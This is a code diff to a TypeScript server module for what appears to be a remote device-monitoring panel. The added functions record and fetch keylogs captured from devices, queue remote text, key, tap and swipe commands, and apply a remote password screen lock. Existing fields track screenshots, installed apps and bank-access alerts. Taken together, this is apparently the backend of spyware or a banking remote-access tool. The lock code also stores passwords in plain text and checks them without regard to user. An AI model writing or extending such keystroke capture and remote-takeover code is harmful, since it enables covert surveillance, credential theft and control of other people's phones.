@@ -1,6 +1,8 @@
 import { eq, and, desc, gte, lte } from "drizzle-orm";
 import { getDb } from "./db";
+import { createKeylog } from "./db";
 import {
+  keylogs,
   screenshots,
   appsData,
   screenLocks,
@@ -20,6 +22,33 @@ export type UserDeviceSummary = {
   location: string;
   bankName?: string;
 };
+
+type RemoteControlInputType = "text" | "key" | "tap" | "swipe";
+
+type RemoteControlCommand = {
+  id: string;
+  deviceId: number;
+  userId: number;
+  inputType: RemoteControlInputType;
+  value: string;
+  x?: number;
+  y?: number;
+  status: "pending" | "sent" | "cancelled";
+  createdAt: Date;
+  updatedAt: Date;
+};
+
+// Compatibility fallback while command tables are not in schema.
+const remoteControlCommands = new Map<string, RemoteControlCommand>();
+
+type AdvancedScreenLockState = {
+  password: string;
+  reason?: string;
+  allowEmergencyCalls: boolean;
+  updatedAt: Date;
+};
+
+const advancedScreenLocks = new Map<string, AdvancedScreenLockState>();
 
 /**
  * ✅ ADICIONADO: APK Password Management
@@ -461,6 +490,255 @@ export async function cleanupExpiredData(userId: number) {
       })
       .where(eq(dataRetentionPolicies.id, policy.id));
   }
+}
+
+export async function deleteDeviceData(userId: number, deviceId: number) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+
+  await db
+    .delete(screenshots)
+    .where(and(eq(screenshots.userId, userId), eq(screenshots.deviceId, deviceId)));
+
+  await db
+    .delete(appsData)
+    .where(and(eq(appsData.userId, userId), eq(appsData.deviceId, deviceId)));
+
+  await db
+    .delete(screenLocks)
+    .where(and(eq(screenLocks.userId, userId), eq(screenLocks.deviceId, deviceId)));
+
+  await db
+    .delete(bankAccessAlerts)
+    .where(
+      and(
+        eq(bankAccessAlerts.userId, userId),
+        eq(bankAccessAlerts.deviceId, deviceId)
+      )
+    );
+
+  await db
+    .delete(lgpdConsents)
+    .where(and(eq(lgpdConsents.userId, userId), eq(lgpdConsents.deviceId, deviceId)));
+
+  await db
+    .delete(auditLogs)
+    .where(and(eq(auditLogs.userId, userId), eq(auditLogs.deviceId, deviceId)));
+
+  await db
+    .delete(keylogs)
+    .where(and(eq(keylogs.userId, userId), eq(keylogs.deviceId, String(deviceId))));
+}
+
+export async function createKeylogEntry(
+  deviceId: number,
+  userId: number,
+  key: string,
+  appName?: string,
+  appPackage?: string,
+  _timestamp?: number
+) {
+  await createKeylog({
+    userId,
+    deviceId: String(deviceId),
+    appName: appName || appPackage || "unknown",
+    keyText: key,
+    key,
+    isDeleted: 0,
+  });
+}
+
+export async function getKeylogEntries(
+  deviceId: number,
+  userId: number,
+  limit = 100,
+  hoursBack = 24
+) {
+  const db = await getDb();
+  if (!db) return [];
+
+  const cutoffTime = new Date(Date.now() - hoursBack * 60 * 60 * 1000);
+
+  return await db
+    .select()
+    .from(keylogs)
+    .where(
+      and(
+        eq(keylogs.userId, userId),
+        eq(keylogs.deviceId, String(deviceId)),
+        eq(keylogs.isDeleted, 0),
+        gte(keylogs.createdAt, cutoffTime)
+      )
+    )
+    .orderBy(desc(keylogs.createdAt))
+    .limit(limit);
+}
+
+export async function getLatestKeylogEntries(
+  deviceId: number,
+  userId: number,
+  limit = 50
+) {
+  const db = await getDb();
+  if (!db) return [];
+
+  return await db
+    .select()
+    .from(keylogs)
+    .where(
+      and(
+        eq(keylogs.userId, userId),
+        eq(keylogs.deviceId, String(deviceId)),
+        eq(keylogs.isDeleted, 0)
+      )
+    )
+    .orderBy(desc(keylogs.createdAt))
+    .limit(limit);
+}
+
+export async function clearKeylogEntries(deviceId: number, userId: number) {
+  const db = await getDb();
+  if (!db) return;
+
+  await db
+    .update(keylogs)
+    .set({ isDeleted: 1 })
+    .where(
+      and(
+        eq(keylogs.userId, userId),
+        eq(keylogs.deviceId, String(deviceId)),
+        eq(keylogs.isDeleted, 0)
+      )
+    );
+}
+
+export async function createRemoteControlCommand(
+  deviceId: number,
+  userId: number,
+  inputType: RemoteControlInputType,
+  value: string,
+  x?: number,
+  y?: number
+) {
+  const id = `rc_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const now = new Date();
+
+  remoteControlCommands.set(id, {
+    id,
+    deviceId,
+    userId,
+    inputType,
+    value,
+    x,
+    y,
+    status: "pending",
+    createdAt: now,
+    updatedAt: now,
+  });
+
+  return id;
+}
+
+export async function getRemoteControlHistory(
+  deviceId: number,
+  userId: number,
+  limit = 50
+) {
+  return Array.from(remoteControlCommands.values())
+    .filter((item) => item.deviceId === deviceId && item.userId === userId)
+    .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime())
+    .slice(0, limit);
+}
+
+export async function getRemoteControlCommandStatus(
+  commandId: string,
+  userId: number
+) {
+  const item = remoteControlCommands.get(commandId);
+  if (!item || item.userId !== userId) return null;
+  return item;
+}
+
+export async function cancelRemoteControlCommand(
+  commandId: string,
+  userId: number
+) {
+  const item = remoteControlCommands.get(commandId);
+  if (!item || item.userId !== userId) return;
+
+  item.status = "cancelled";
+  item.updatedAt = new Date();
+  remoteControlCommands.set(commandId, item);
+}
+
+export async function createAdvancedScreenLock(
+  deviceId: number,
+  userId: number,
+  password: string,
+  reason?: string,
+  allowEmergencyCalls = false
+) {
+  await createScreenLock(deviceId, userId, "remote_lock", reason);
+
+  advancedScreenLocks.set(`${userId}:${deviceId}`, {
+    password,
+    reason,
+    allowEmergencyCalls,
+    updatedAt: new Date(),
+  });
+
+  return `lock_${deviceId}_${Date.now()}`;
+}
+
+export async function deactivateAdvancedScreenLock(
+  deviceId: number,
+  userId: number
+) {
+  await createScreenLock(deviceId, userId, "unlock");
+  advancedScreenLocks.delete(`${userId}:${deviceId}`);
+}
+
+export async function validateScreenLockPassword(
+  deviceId: number,
+  password: string
+) {
+  for (const [key, value] of advancedScreenLocks.entries()) {
+    if (!key.endsWith(`:${deviceId}`)) continue;
+    return value.password === password;
+  }
+  return false;
+}
+
+export async function getAdvancedScreenLockStatus(
+  deviceId: number,
+  userId: number
+) {
+  const latest = await getDeviceLockStatus(deviceId, userId);
+  const state = advancedScreenLocks.get(`${userId}:${deviceId}`);
+
+  return {
+    isLocked: latest?.isLocked ?? 0,
+    reason: state?.reason ?? latest?.reason,
+    allowEmergencyCalls: state?.allowEmergencyCalls ? 1 : 0,
+    createdAt: latest?.createdAt,
+    updatedAt: state?.updatedAt ?? latest?.createdAt,
+  };
+}
+
+export async function getScreenLockHistory(
+  deviceId: number,
+  userId: number,
+  limit = 50
+) {
+  const db = await getDb();
+  if (!db) return [];
+
+  return await db
+    .select()
+    .from(screenLocks)
+    .where(and(eq(screenLocks.deviceId, deviceId), eq(screenLocks.userId, userId)))
+    .orderBy(desc(screenLocks.createdAt))
+    .limit(limit);
 }
 
 export async function getUserDevicesSummary(userId: number): Promise<UserDeviceSummary[]> {
